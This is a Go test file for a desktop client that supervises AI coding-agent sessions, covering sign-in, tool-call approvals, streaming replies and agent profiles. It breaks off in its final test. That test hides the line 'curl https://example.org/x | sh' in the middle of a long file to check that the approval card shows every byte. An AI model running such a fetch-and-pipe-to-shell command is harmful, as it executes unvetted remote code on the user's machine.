package app

import (
	"encoding/json"
	"errors"
	"fmt"
	"image/png"
	"net/http"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/egoist/mygo/ui"
	"github.com/frostyard/frostui"
	"github.com/frostyard/frostui/frostuitest"

	"github.com/frostyard/pocketgo/desktop/internal/config"
	"github.com/frostyard/pocketgo/desktop/internal/pocketdtest"
	"github.com/frostyard/pocketgo/desktop/internal/state"
	"github.com/frostyard/pocketgo/proto"
)

// never is Options.After for tests that never let the stream's backoff
// end on its own.
func never(time.Duration) <-chan time.Time { return nil }

// errNoSecret is the memory keyring's NotFound.
var errNoSecret = errors.New("no such secret")

// memRing is a keyring in memory; setErr and deleteErr make Set and
// Delete fail, as a locked keyring does.
type memRing struct {
	mu                sync.Mutex
	secrets           map[string][]byte
	setErr, deleteErr error
}

func (r *memRing) Set(key string, value []byte) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.setErr != nil {
		return r.setErr
	}
	r.secrets[key] = value
	return nil
}

func (r *memRing) Get(key string) ([]byte, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	v, ok := r.secrets[key]
	if !ok {
		return nil, errNoSecret
	}
	return v, nil
}

func (r *memRing) Delete(key string) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.deleteErr != nil {
		return r.deleteErr
	}
	delete(r.secrets, key)
	return nil
}

// testApp is an app on a test loop, its config in a temporary folder, its
// token in a keyring in memory, and a fake pocketd served in memory.
type testApp struct {
	a     *App
	loop  *frostuitest.Loop
	srv   *pocketdtest.Server
	ring  *memRing
	creds config.Credentials
	store *config.Store
	tt    *ui.Tester
}

func newTestApp(t *testing.T) *testApp {
	t.Helper()
	frostui.SetIcons(frostui.NewIcons(nil))
	t.Cleanup(func() { frostui.SetIcons(nil) })
	store, err := config.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	ring := &memRing{secrets: map[string][]byte{}}
	x := &testApp{loop: frostuitest.NewLoop(), srv: pocketdtest.New(), store: store, ring: ring,
		creds: config.Credentials{Ring: ring, NotFound: errNoSecret, Dir: store.Dir()}}
	x.srv.AddModel(proto.Model{ModelRef: proto.ModelRef{Provider: "anthropic", ID: "claude-opus-5-5"}, Name: "Claude Opus 5.5", Reasoning: true,
		ThinkingLevels: []string{"off", "minimal", "low", "medium", "high", "xhigh"}})
	x.srv.AddModel(proto.Model{ModelRef: proto.ModelRef{Provider: "openai-codex", ID: "gpt-5.5"}, Name: "GPT-5.5", Reasoning: true,
		ThinkingLevels: []string{"off", "low", "medium", "high"}})
	x.a = x.newApp(t)
	x.tt = ui.NewTesterWith(x.a.View, 1280, 820, ui.TesterOptions{Dark: os.Getenv("POCKETGO_DARK") != ""})
	return x
}

// newApp is an app over the test app's settings, keyring and pocketd, as
// after starting the program again.
func (x *testApp) newApp(t *testing.T) *App {
	t.Helper()
	a, err := New(Options{Version: "test", Post: x.loop.Post, Store: x.store, Creds: x.creds, After: never, Transport: x.srv.Transport()})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(a.Close)
	return a
}

// connect signs the app in to the fake pocketd and waits for its lists.
func (x *testApp) connect(t *testing.T) {
	t.Helper()
	if err := x.a.st.Connect(x.srv.URL, pocketdtest.Token); err != nil {
		t.Fatal(err)
	}
	x.until(t, func() bool { return x.a.st.Conn.State == state.Connected && x.a.st.Hello() != nil })
	x.untilLoaded(t)
}

// untilLoaded waits until the lists' first fetches answered and nothing
// is in flight: a view that tells an empty list from a loading one reads
// them.
func (x *testApp) untilLoaded(t *testing.T) {
	t.Helper()
	x.until(t, func() bool {
		sessions, _ := x.a.st.Data.SessionsStatus()
		approvals, _ := x.a.st.Data.ApprovalsStatus()
		asks, _ := x.a.st.Data.AsksStatus()
		lessons, _ := x.a.st.Data.LessonsStatus()
		return sessions != state.ListLoading && approvals != state.ListLoading && asks != state.ListLoading &&
			lessons != state.ListLoading && x.a.st.InFlight() == 0
	})
}

// until runs the loop until cond holds, then draws.
func (x *testApp) until(t *testing.T, cond func() bool) {
	t.Helper()
	x.loop.RunUntil(t, cond)
	x.settle()
}

// settle draws until what was posted and what animates is done.
func (x *testApp) settle() {
	for range 6 {
		x.tt.Advance(200 * time.Millisecond)
		x.loop.Flush()
		x.tt.Frame()
	}
}

func (x *testApp) click(t *testing.T, label string) {
	t.Helper()
	if err := x.tt.Click(label); err != nil {
		t.Fatalf("click %q: %v (texts %q)", label, err, x.tt.Texts())
	}
	x.settle()
}

func (x *testApp) hasAll(t *testing.T, texts ...string) {
	t.Helper()
	for _, s := range texts {
		if !x.tt.HasText(s) {
			t.Errorf("missing %q in %q", s, x.tt.Texts())
		}
	}
}

// snapshot writes the last frame as a PNG in POCKETGO_SNAPSHOT_DIR, when
// it is set.
func (x *testApp) snapshot(t *testing.T, name string) {
	t.Helper()
	dir := os.Getenv("POCKETGO_SNAPSHOT_DIR")
	if dir == "" {
		return
	}
	if os.Getenv("POCKETGO_DARK") != "" {
		name += "-dark"
	}
	f, err := os.Create(filepath.Join(dir, name+".png"))
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	if err := png.Encode(f, x.tt.Image()); err != nil {
		t.Fatal(err)
	}
}

func at(d time.Duration) time.Time { return pocketdtest.Now.Add(d) }

// seed gives the fake pocketd three sessions, one of each state, and two
// approvals waiting.
func (x *testApp) seed() {
	model := proto.ModelRef{Provider: "anthropic", ID: "claude-opus-5-5"}
	x.srv.AddSession(proto.Session{ID: 1, Title: "Fix the flaky CI in nsl", Cwd: "/home/team/projects/nsl", Model: model, Thinking: "high",
		State: proto.SessionWaiting, UpdatedAt: at(-time.Minute)},
		proto.Entry{ID: 1, SessionID: 1, Kind: proto.EntryUser, Text: "The **arm64** job fails about once a day. Find out why and fix it.", At: at(-10 * time.Minute)},
		proto.Entry{ID: 2, SessionID: 1, Kind: proto.EntryAssistant, Thinking: "Start with the job's recent logs.",
			Text:      "I'll look at the last failing runs first.",
			ToolCalls: []proto.ToolCall{{ID: "c1", Name: "bash", Arguments: json.RawMessage(`{"command":"gh run list --workflow ci.yml --status failure --limit 5"}`)}},
			At:        at(-9 * time.Minute)},
		proto.Entry{ID: 3, SessionID: 1, Kind: proto.EntryToolResult, ToolResult: &proto.ToolResult{CallID: "c1", Name: "bash",
			Text: "completed  failure  ci  main  arm64 (timeout)  12m\ncompleted  failure  ci  main  arm64 (timeout)  11m"}, At: at(-9 * time.Minute)},
	)
	x.srv.AddSession(proto.Session{ID: 2, Title: "Desk dashboard: weekly metrics", Cwd: "/home/team/projects/pi-pocket-team", Model: model,
		State: proto.SessionRunning, UpdatedAt: at(-2 * time.Minute)})
	x.srv.AddSession(proto.Session{ID: 3, Title: "Draft the release notes", Cwd: "/home/team/projects/frostread", Model: model,
		State: proto.SessionIdle, UpdatedAt: at(-time.Hour)})
	x.srv.AddSession(proto.Session{ID: 4, Title: "Snow image fails to boot", Cwd: "/home/team/projects/snow", Model: model,
		State: proto.SessionWaiting, UpdatedAt: at(-3 * time.Minute)})
	x.srv.AddApproval(proto.Approval{ID: "a1", SessionID: 1, CallID: "w1", Tool: "write",
		Arguments: json.RawMessage(`{"path":".github/workflows/ci.yml","content":"timeout-minutes: 30\n"}`), State: proto.ApprovalPending, RequestedAt: at(-time.Minute)})
	x.srv.AddApproval(proto.Approval{ID: "a2", SessionID: 4, CallID: "b9", Tool: "bash",
		Arguments: json.RawMessage(`{"command":"sudo bootc switch ghcr.io/frostyard/snow:testing"}`), State: proto.ApprovalPending, RequestedAt: at(-30 * time.Second)})
}

func TestSignInSnapshot(t *testing.T) {
	x := newTestApp(t)
	x.settle()
	x.hasAll(t, "Connect to pocketd", "Service URL", "Device token", "Connect")
	if field, ok := x.tt.AccessByRole(ui.RoleTextField, "Device token"); !ok || !field.Password {
		t.Errorf("the token field is not masked: %+v, found %v", field, ok)
	}
	// The URL field's placeholder reads as an example, not as a value
	// already filled in: the owner once took it for one.
	if field, ok := x.tt.AccessByRole(ui.RoleTextField, "Service URL"); !ok || !strings.HasPrefix(field.Placeholder, "e.g. ") {
		t.Errorf("the URL placeholder reads like a value: %q, found %v", field.Placeholder, ok)
	}
	x.snapshot(t, "signin")

	// Plain HTTP to a host outside the tailnet waits for the owner's word,
	// and nothing leaves the device meanwhile.
	x.a.signIn.server, x.a.signIn.token = "http://192.0.2.10:8080", pocketdtest.Token
	x.settle()
	x.click(t, "Connect")
	x.hasAll(t, "Connect Anyway", "Cancel")
	if !strings.Contains(strings.Join(x.tt.Texts(), " "), "clear text") {
		t.Errorf("no warning in %q", x.tt.Texts())
	}
	x.snapshot(t, "signin-http-warning")
	if n := len(x.srv.Requests()); n != 0 {
		t.Errorf("%d requests left before the owner confirmed", n)
	}
	x.click(t, "Cancel")

	// A wrong token says so.
	x.a.signIn.server, x.a.signIn.token = x.srv.URL, "pgd_wrong"
	x.settle()
	x.click(t, "Connect")
	x.until(t, func() bool { return x.a.signIn.err != "" })
	if !strings.Contains(x.a.signIn.err, "refused the device token") || !strings.Contains(x.a.signIn.err, "only the pgd_… value") {
		t.Errorf("error %q", x.a.signIn.err)
	}

	// The right one signs in, keeps the token and remembers the service.
	x.a.signIn.token = pocketdtest.Token
	x.settle()
	x.click(t, "Connect")
	x.until(t, func() bool { return x.a.st.SignedIn() && x.a.st.Conn.State == state.Connected })
	if tok, err := x.creds.Token(x.srv.URL); err != nil || tok != pocketdtest.Token {
		t.Errorf("kept token %q, %v", tok, err)
	}
	if files, _ := filepath.Glob(filepath.Join(x.store.Dir(), "token-*")); len(files) != 0 {
		t.Errorf("the token went to %v though the keyring works", files)
	}
	if st, _ := x.store.Load(); st.Server != x.srv.URL {
		t.Errorf("remembered service %q", st.Server)
	}
	if x.a.signIn.token != "" {
		t.Error("the form still holds the token")
	}
	// The stream's opening fetches the approvals after it says Connected.
	x.untilLoaded(t)
	x.hasAll(t, "Inbox", "Nothing waits for you")
}

// typeInto clicks the text field labelled label and types text into it, as
// a person does, so the view's own bindings carry it into the form.
func (x *testApp) typeInto(t *testing.T, label, text string) {
	t.Helper()
	field, ok := x.tt.AccessByRole(ui.RoleTextField, label)
	if !ok {
		t.Fatalf("no text field %q in %q", label, x.tt.Texts())
	}
	x.tt.ClickAt(field.Bounds.X+field.Bounds.W/2, field.Bounds.Y+field.Bounds.H/2)
	x.tt.Type(text)
	x.settle()
}

// Connect is clickable with a field left empty, and the click says which
// one: the owner pasted a token, left the URL field with only its
// placeholder, and met a disabled button that never said why.
func TestConnectSaysWhichFieldIsMissing(t *testing.T) {
	for _, tc := range []struct {
		name, field, text, want string
	}{
		{"only the token", "Device token", pocketdtest.Token, "Enter the service URL"},
		{"only the URL", "Service URL", "http://pocket.example.ts.net:8788", "Paste the device token"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			x := newTestApp(t)
			x.settle()
			x.typeInto(t, tc.field, tc.text)
			if b, ok := x.tt.AccessByRole(ui.RoleButton, "Connect"); !ok || b.Disabled {
				t.Fatalf("Connect is disabled or missing: %+v, found %v", b, ok)
			}
			x.click(t, "Connect")
			if !strings.HasPrefix(x.a.signIn.err, tc.want) {
				t.Errorf("error %q, want it to start with %q", x.a.signIn.err, tc.want)
			}
			x.hasAll(t, tc.want)
			if n := len(x.srv.Requests()); n != 0 {
				t.Errorf("%d requests left with a field empty", n)
			}
		})
	}
}

func TestSessionsAndInboxSnapshot(t *testing.T) {
	x := newTestApp(t)
	x.seed()
	x.connect(t)
	x.hasAll(t, "Inbox", "SESSIONS", "Fix the flaky CI in nsl", "Desk dashboard: weekly metrics", "Draft the release notes",
		"Snow image fails to boot", "waiting", "running", "idle", "write waits for your approval", "bash waits for your approval",
		".github/workflows/ci.yml", "Allow", "Deny", "Open Session", "2 tool calls wait for you", "2 sessions wait", "1 session runs")
	x.snapshot(t, "sessions-inbox")

	// Allow the oldest from the Inbox: it leaves the lists.
	x.click(t, "Allow")
	x.until(t, func() bool { return len(x.a.st.Data.Approvals()) == 1 })
	var body proto.Decide
	reqs := x.srv.RequestsTo(http.MethodPost, proto.Path(proto.PathApproval, "a1"))
	if len(reqs) != 1 || json.Unmarshal(reqs[0].Body, &body) != nil || !body.Allow || body.RequestID == "" {
		t.Fatalf("the decision sent %+v", reqs)
	}
	x.hasAll(t, "1 tool call waits for you")
	if x.tt.HasText("write waits for your approval") {
		t.Error("the allowed call still shows")
	}

	// Open Session goes to the session of the card.
	x.click(t, "Open Session")
	x.until(t, func() bool { return x.a.st.Data.Open() != nil && x.a.st.Data.Open().Loaded })
	if x.a.place != placeSession || x.a.st.Data.OpenID() != 4 {
		t.Errorf("place %v, session %d; want session 4", x.a.place, x.a.st.Data.OpenID())
	}
}

func TestSessionWithAnApprovalSnapshot(t *testing.T) {
	x := newTestApp(t)
	x.seed()
	x.connect(t)
	x.click(t, "Fix the flaky CI in nsl, waiting")
	x.until(t, func() bool { return x.a.st.Data.Open() != nil && x.a.st.Data.Open().Loaded })
	// The run streams its reply and asks to write a file.
	x.srv.Emit(proto.Event{Type: proto.EventLive, Live: &proto.Live{SessionID: 1, Busy: true,
		Partial: &proto.Entry{Kind: proto.EntryAssistant, Text: "Both failures are **timeouts** on the arm64 runner. I'll raise the job's limit to 30 minutes:",
			ToolCalls: []proto.ToolCall{{ID: "w1", Name: "write", Arguments: json.RawMessage(`{"path":".github/workflows/ci.yml","content":"timeout-minutes: 30\n"}`)}}},
		Tools: []proto.LiveTool{{CallID: "w1", Name: "write", Status: proto.ToolPending}}}})
	x.until(t, func() bool { return x.a.st.Data.Open().Live.Partial != nil })
	x.settle()
	x.hasAll(t, "Fix the flaky CI in nsl", "You", "The arm64 job fails about once a day. Find out why and fix it.",
		"Thinking", "I'll look at the last failing runs first.", "bash", "done", "write", "waiting for you",
		"write waits for your approval", "Allow", "Deny", "Abort", "Send")
	x.snapshot(t, "session-approval")

	// A tool call opens to show its arguments and result.
	x.click(t, "bash gh run list --workflow ci.yml --status failure --limit 5")
	x.hasAll(t, "Arguments", "Result")

	// Deny with a reason: the card goes, and pocketd has the reason.
	*x.a.reasons["a1"] = "Raise it to 20 minutes, not 30"
	x.settle()
	x.click(t, "Deny")
	x.until(t, func() bool { return len(x.a.st.Data.ApprovalsFor(1)) == 0 })
	var body proto.Decide
	reqs := x.srv.RequestsTo(http.MethodPost, proto.Path(proto.PathApproval, "a1"))
	if len(reqs) != 1 || json.Unmarshal(reqs[0].Body, &body) != nil || body.Allow || body.Reason != "Raise it to 20 minutes, not 30" {
		t.Fatalf("the denial sent %+v", reqs)
	}

	// Abort stops the run.
	x.click(t, "Abort")
	x.until(t, func() bool { return !x.a.st.Data.Open().Live.Busy })
	if n := len(x.srv.RequestsTo(http.MethodPost, proto.Path(proto.PathAbort, 1))); n != 1 {
		t.Errorf("%d aborts sent", n)
	}

	// Enter sends the draft; it clears once pocketd took it, and the
	// message shows from its entry event.
	*x.a.composer.draft(1) = "Use 20 minutes instead."
	x.settle()
	x.click(t, "Send")
	// The entry comes on the stream and the send's answer on its own
	// request: wait for both.
	x.until(t, func() bool {
		return len(x.a.st.Data.Open().Entries) == 4 && !x.a.st.Sending(1).Busy && x.a.st.InFlight() == 0
	})
	if got := *x.a.composer.draft(1); got != "" {
		t.Errorf("the draft is still %q", got)
	}
	x.hasAll(t, "Use 20 minutes instead.")
}

func TestStreamingReplySnapshot(t *testing.T) {
	x := newTestApp(t)
	x.seed()
	x.connect(t)
	x.click(t, "Draft the release notes, idle")
	x.until(t, func() bool { return x.a.st.Data.Open() != nil && x.a.st.Data.Open().Loaded })
	x.srv.Emit(proto.Event{Type: proto.EventEntry, Entry: &proto.Entry{ID: 1, SessionID: 3, Kind: proto.EntryUser, Text: "Draft the v0.6.0 notes from the merged PRs.", At: at(0)}})
	x.srv.Emit(proto.Event{Type: proto.EventLive, Live: &proto.Live{SessionID: 3, Busy: true,
		Partial: &proto.Entry{Kind: proto.EntryAssistant, Thinking: "List the merged PRs since v0.5.0.",
			ToolCalls: []proto.ToolCall{{ID: "r1", Name: "bash", Arguments: json.RawMessage(`{"command":"gh pr list --state merged --base main"}`)}}},
		Tools: []proto.LiveTool{{CallID: "r1", Name: "bash", Status: proto.ToolRunning}}}})
	x.until(t, func() bool { o := x.a.st.Data.Open(); return len(o.Entries) == 1 && o.Live.Busy })
	x.hasAll(t, "Draft the v0.6.0 notes from the merged PRs.", "Thinking", "bash", "running", "Working…")
	x.srv.Emit(proto.Event{Type: proto.EventEntry, Entry: &proto.Entry{ID: 2, SessionID: 3, Kind: proto.EntryAssistant, Thinking: "List the merged PRs since v0.5.0.",
		ToolCalls: []proto.ToolCall{{ID: "r1", Name: "bash", Arguments: json.RawMessage(`{"command":"gh pr list --state merged --base main"}`)}}, At: at(time.Second)}})
	x.srv.Emit(proto.Event{Type: proto.EventEntry, Entry: &proto.Entry{ID: 3, SessionID: 3, Kind: proto.EntryToolResult,
		ToolResult: &proto.ToolResult{CallID: "r1", Name: "bash", Text: "#212 Search inside books\n#215 Faster library scans"}, At: at(2 * time.Second)}})
	x.srv.Emit(proto.Event{Type: proto.EventLive, Live: &proto.Live{SessionID: 3, Busy: true,
		Partial: &proto.Entry{Kind: proto.EntryAssistant, Text: "## frostread v0.6.0\n\n- **Search inside books** (#212)\n- Faster library scans (#215)"}}})
	x.until(t, func() bool {
		o := x.a.st.Data.Open()
		return len(o.Entries) == 3 && o.Live.Partial != nil && o.Live.Partial.Text != ""
	})
	x.settle()
	x.hasAll(t, "frostread v0.6.0", "Search inside books", "done")
	if x.tt.HasText("Working…") {
		t.Error("the working line shows while words stream in")
	}
	x.snapshot(t, "session-streaming")
	// The run fails: its failure shows above the composer.
	x.srv.Emit(proto.Event{Type: proto.EventLive, Live: &proto.Live{SessionID: 3, Failure: "the provider is overloaded"}})
	x.until(t, func() bool { return x.a.st.Data.Open().Live.Failure != "" })
	x.hasAll(t, "The run failed: the provider is overloaded")
}

// TestNewSessionOffersTheModelsPocketdRunsNow starts with no provider signed
// in: once one is, Reload Models and opening the dialog again offer its
// models.
func TestNewSessionOffersTheModelsPocketdRunsNow(t *testing.T) {
	x := newTestApp(t)
	x.srv.SetModels(nil)
	x.connect(t)
	x.click(t, "New Session")
	x.until(t, func() bool { m, _ := x.a.st.Models(); return m != nil && x.a.st.InFlight() == 0 })
	x.hasAll(t, "Reload Models")
	if !strings.Contains(strings.Join(x.tt.Texts(), " "), "pocketd runs no model now") {
		t.Fatalf("no explanation in %q", x.tt.Texts())
	}
	x.srv.SetModels([]proto.Model{{ModelRef: proto.ModelRef{Provider: "anthropic", ID: "claude-opus-5-5"}, Name: "Claude Opus 5.5"}})
	x.click(t, "Reload Models")
	x.until(t, func() bool { m, _ := x.a.st.Models(); return len(m) == 1 && x.a.st.InFlight() == 0 })
	x.hasAll(t, "Claude Opus 5.5 · anthropic")
	if x.a.newSession.chosen().ID != "claude-opus-5-5" {
		t.Errorf("chosen %+v", x.a.newSession.chosen())
	}
	// Another provider signs in: opening the dialog again asks pocketd.
	x.click(t, "Cancel")
	x.srv.AddModel(proto.Model{ModelRef: proto.ModelRef{Provider: "openai-codex", ID: "gpt-5.5"}, Name: "GPT-5.5"})
	x.click(t, "New Session")
	x.until(t, func() bool { m, _ := x.a.st.Models(); return len(m) == 2 && x.a.st.InFlight() == 0 })
	if got := x.a.newSession.labels(); len(got) != 2 || got[1] != "GPT-5.5 · openai-codex" {
		t.Errorf("the dialog offers %q", got)
	}
}

func TestNewSessionStartsAndOpens(t *testing.T) {
	x := newTestApp(t)
	x.seed()
	x.connect(t)
	x.click(t, "New Session")
	x.hasAll(t, "New session", "Working directory", "Model", "Claude Opus 5.5 · anthropic", "Thinking", "Start Session")
	f := x.a.newSession
	f.cwd = "projects/demo"
	x.settle()
	x.click(t, "Start Session")
	if !strings.Contains(f.err, "absolute path") {
		t.Errorf("a relative directory says %q", f.err)
	}
	f.cwd, f.title, f.thinking = "/home/team/projects/demo", "Try the new client", "low"
	x.settle()
	x.click(t, "Start Session")
	x.until(t, func() bool {
		return x.a.place == placeSession && x.a.st.Data.Open() != nil && x.a.st.Data.Open().Loaded
	})
	s, ok := x.a.st.Data.Session(x.a.st.Data.OpenID())
	if !ok || s.Title != "Try the new client" || s.Thinking != "low" || s.Model.ID != "claude-opus-5-5" {
		t.Errorf("opened %+v", s)
	}
	if f.open {
		t.Error("the dialog stayed open")
	}
	x.hasAll(t, "Try the new client", "A fresh start")
}

// A session can start from a profile: the form takes the profile's home
// and its own model, and pocketd records the profile and the route. A
// profile that cannot start is named with its problem, not offered.
func TestNewSessionFromAProfile(t *testing.T) {
	x := newTestApp(t)
	x.seed()
	opus := proto.ModelRef{Provider: "anthropic", ID: "claude-opus-5-5"}
	x.srv.AddProfile(proto.Profile{ID: "odrade", Name: "Odrade", Role: proto.RoleSupervisor, Model: opus, Runs: opus, Home: "/home/team/agents/odrade"})
	x.srv.AddProfile(proto.Profile{ID: "clerk", Problem: "profile clerk runs github-copilot/gpt-6-luna, which pocketd cannot run"})
	x.connect(t)
	x.click(t, "New Session")
	x.hasAll(t, "Profile", "No profile", "1 profile cannot start: clerk")
	f := x.a.newSession
	if slices.ContainsFunc(f.profileChoices, func(ch state.ProfileChoice) bool { return ch.ID == "clerk" }) {
		t.Error("a profile with a problem is offered")
	}
	// The form suggested the last session's folder: the profile's home
	// replaces it.
	if f.cwd == "" || f.cwd != f.suggestedCwd {
		t.Fatalf("no suggested folder: %q", f.cwd)
	}
	f.profile = "Odrade · supervisor"
	x.settle()
	if f.cwd != "/home/team/agents/odrade" || f.model != "The profile's model · anthropic/claude-opus-5-5" {
		t.Fatalf("after choosing odrade: cwd %q, model %q", f.cwd, f.model)
	}
	x.hasAll(t, "Odrade · supervisor", "The profile's model · anthropic/claude-opus-5-5")

	// The profile changes while the form is open: its model and home
	// follow, since the owner changed neither.
	sonnet := proto.ModelRef{Provider: "anthropic", ID: "claude-sonnet-5-5"}
	x.srv.AddModel(proto.Model{ModelRef: sonnet, Name: "Claude Sonnet 5.5"})
	x.srv.SetProfiles([]proto.Profile{{ID: "odrade", Name: "Odrade", Role: proto.RoleSupervisor, Model: sonnet, Runs: sonnet, Home: "/home/team/agents/odrade2"}})
	x.a.st.LoadProfiles()
	x.a.st.LoadModels()
	x.until(t, func() bool { return x.a.st.InFlight() == 0 })
	if f.cwd != "/home/team/agents/odrade2" || f.model != "The profile's model · anthropic/claude-sonnet-5-5" {
		t.Fatalf("after odrade changed: cwd %q, model %q", f.cwd, f.model)
	}
	// A folder the owner typed stays.
	f.cwd = "/home/team/projects/demo"
	x.srv.SetProfiles([]proto.Profile{{ID: "odrade", Name: "Odrade", Role: proto.RoleSupervisor, Model: opus, Runs: opus, Home: "/home/team/agents/odrade"}})
	x.a.st.LoadProfiles()
	x.until(t, func() bool { return x.a.st.InFlight() == 0 })
	if f.cwd != "/home/team/projects/demo" || f.model != "The profile's model · anthropic/claude-opus-5-5" {
		t.Fatalf("after another change: cwd %q, model %q", f.cwd, f.model)
	}
	f.cwd = "/home/team/agents/odrade"
	x.click(t, "Start Session")
	x.until(t, func() bool {
		return x.a.place == placeSession && x.a.st.Data.Open() != nil && x.a.st.Data.Open().Loaded
	})
	s, ok := x.a.st.Data.Session(x.a.st.Data.OpenID())
	if !ok || s.Profile != "odrade" || s.Route != "profile" || s.Cwd != "/home/team/agents/odrade" || s.Model != opus {
		t.Errorf("opened %+v", s)
	}
}

// A chosen profile pocketd no longer offers stays chosen, marked, and
// nothing starts from it: falling back to no profile would start an agent
// with every tool in place of the one chosen.
func TestAProfileThatDisappearsBlocksTheStart(t *testing.T) {
	x := newTestApp(t)
	x.seed()
	opus := proto.ModelRef{Provider: "anthropic", ID: "claude-opus-5-5"}
	x.srv.AddProfile(proto.Profile{ID: "vera", Name: "Vera", Role: proto.RoleAgent, Model: opus, Runs: opus, Home: "/home/team/agents/vera", Tools: []string{"read"}})
	x.connect(t)
	x.click(t, "New Session")
	f := x.a.newSession
	f.profile = "Vera · agent"
	x.settle()
	x.srv.SetProfiles(nil)
	x.a.st.LoadProfiles()
	x.until(t, func() bool { return x.a.st.InFlight() == 0 })
	if f.profile != "Vera · agent (no longer available)" {
		t.Fatalf("the choice became %q", f.profile)
	}
	sessions := len(x.a.st.Data.Sessions())
	x.click(t, "Start Session")
	x.until(t, func() bool { return x.a.st.InFlight() == 0 })
	if !strings.Contains(f.err, "no longer offers the profile vera") || len(x.a.st.Data.Sessions()) != sessions {
		t.Fatalf("error %q, sessions %d then %d", f.err, sessions, len(x.a.st.Data.Sessions()))
	}
}

// A profile chosen as a fresh list arrives still takes its folder: the
// form tracks the profile it applied, not the label a refresh restored.
func TestAProfileChosenDuringARefreshTakesItsFolder(t *testing.T) {
	x := newTestApp(t)
	x.seed()
	opus := proto.ModelRef{Provider: "anthropic", ID: "claude-opus-5-5"}
	x.srv.AddProfile(proto.Profile{ID: "odrade", Name: "Odrade", Role: proto.RoleSupervisor, Runs: opus, Home: "/home/team/agents/odrade", Cwd: "/home/team/agents/odrade"})
	x.connect(t)
	x.click(t, "New Session")
	f := x.a.newSession
	suggested := f.cwd
	x.srv.AddProfile(proto.Profile{ID: "vera", Name: "Vera", Role: proto.RoleAgent, Runs: opus, Cwd: "/home/team/agents/vera"})
	x.a.st.LoadProfiles()
	f.profile = "Odrade · supervisor"
	x.until(t, func() bool { return x.a.st.InFlight() == 0 })
	if f.cwd != "/home/team/agents/odrade" || suggested == f.cwd {
		t.Fatalf("cwd %q after choosing odrade during a refresh (suggested %q)", f.cwd, suggested)
	}
}

// Reload Models also reloads the profiles: which can start depends on the
// same sign-ins. A dialog of many profiles that cannot start keeps its
// buttons in the smallest window.
func TestReloadModelsReloadsProfilesAndTheDialogFits(t *testing.T) {
	x := newTestApp(t)
	x.srv.SetModels(nil)
	for i := range 13 {
		x.srv.AddProfile(proto.Profile{ID: fmt.Sprintf("agent%02d", i), Problem: strings.Repeat("no sign-in serves this profile's model; ", 4)})
	}
	x.connect(t)
	x.tt.SetSize(760, 480)
	x.click(t, "New Session")
	x.until(t, func() bool { return x.a.st.InFlight() == 0 })
	before := len(x.srv.RequestsTo(http.MethodGet, proto.PathProfiles))
	x.click(t, "Reload Models")
	x.until(t, func() bool { return x.a.st.InFlight() == 0 })
	if after := len(x.srv.RequestsTo(http.MethodGet, proto.PathProfiles)); after != before+1 {
		t.Fatalf("profile fetches %d then %d", before, after)
	}
	if r, ok := x.tt.Find("Start Session"); !ok || r.Y+r.H > 480 {
		t.Fatalf("Start Session at %+v (found %v) in a 480-high window", r, ok)
	}
}

// Switching to a choice with no folder of its own brings back the form's
// first suggestion, never the last profile's home.
func TestAChoiceWithoutAFolderRestoresTheSuggestion(t *testing.T) {
	x := newTestApp(t)
	x.seed()
	opus := proto.ModelRef{Provider: "anthropic", ID: "claude-opus-5-5"}
	x.srv.AddProfile(proto.Profile{ID: "odrade", Name: "Odrade", Role: proto.RoleSupervisor, Runs: opus, Cwd: "/home/team/agents/odrade"})
	x.srv.AddProfile(proto.Profile{ID: "nomad", Name: "Nomad", Role: proto.RoleAgent, Runs: opus})
	x.connect(t)
	x.click(t, "New Session")
	f := x.a.newSession
	original := f.cwd
	for _, step := range []struct{ choice, want string }{
		{"Odrade · supervisor", "/home/team/agents/odrade"},
		{"Nomad · agent", original},
		{"Odrade · supervisor", "/home/team/agents/odrade"},
		{state.NoProfile, original},
	} {
		f.profile = step.choice
		x.settle()
		if f.cwd != step.want {
			t.Fatalf("after %q: cwd %q, want %q", step.choice, f.cwd, step.want)
		}
	}
}

// When the profiles fail to load, the dialog offers its reload even with
// models listed.
func TestAFailedProfileFetchOffersReload(t *testing.T) {
	x := newTestApp(t)
	x.connect(t)
	x.srv.FailOnce(http.MethodGet, proto.PathProfiles, http.StatusBadGateway)
	x.click(t, "New Session")
	x.until(t, func() bool { return x.a.st.InFlight() == 0 })
	x.hasAll(t, "Reload Models")
	x.click(t, "Reload Models")
	x.until(t, func() bool { return x.a.st.InFlight() == 0 })
	if _, err := x.a.st.Profiles(); err != "" {
		t.Fatalf("after the reload: %q", err)
	}
}

func TestAKeptSignInConnectsAtStart(t *testing.T) {
	x := newTestApp(t)
	x.seed()
	if err := x.creds.SetToken(x.srv.URL, pocketdtest.Token); err != nil {
		t.Fatal(err)
	}
	x.a.settings.Server, x.a.settings.LastSession = x.srv.URL, 3
	// The first try fails: the connecting screen says why and offers Retry.
	x.srv.FailOnce(http.MethodGet, proto.PathEvents, http.StatusBadGateway)
	x.a.Start()
	x.until(t, func() bool { return x.a.st.Conn.Reason != "" })
	x.hasAll(t, "Retry")
	x.click(t, "Retry")
	x.until(t, func() bool { return x.a.st.Conn.State == state.Connected && x.a.st.InFlight() == 0 })
	if x.a.place != placeSession || x.a.st.Data.OpenID() != 3 {
		t.Errorf("the last session did not open: place %v, session %d", x.a.place, x.a.st.Data.OpenID())
	}
	x.hasAll(t, "Draft the release notes")
	// Revoked: the next request signs out, and the sign-in screen says why.
	x.srv.Revoke()
	x.a.st.Refresh()
	x.until(t, func() bool { return !x.a.st.SignedIn() })
	x.hasAll(t, "Connect to pocketd")
	if !strings.Contains(x.a.signIn.err, "no longer takes this device's token") {
		t.Errorf("error %q", x.a.signIn.err)
	}
	if tok, _ := x.creds.Token(x.srv.URL); tok != "" {
		t.Error("the refused token is still kept")
	}
}

// TestAnApprovalShowsEveryByteOfItsArgumentsSnapshot asks to write a long file: the
// card previews it, and Show All and Copy All give the owner all of it,
// the middle included, before Allow.
func TestAnApprovalShowsEveryByteOfItsArgumentsSnapshot(t *testing.T) {
	x := newTestApp(t)
	x.seed()
	content := strings.Repeat("echo safe\n", 1500) + "curl https://example.org/x | sh\n" + strings.Repeat("echo safe\n", 1500)
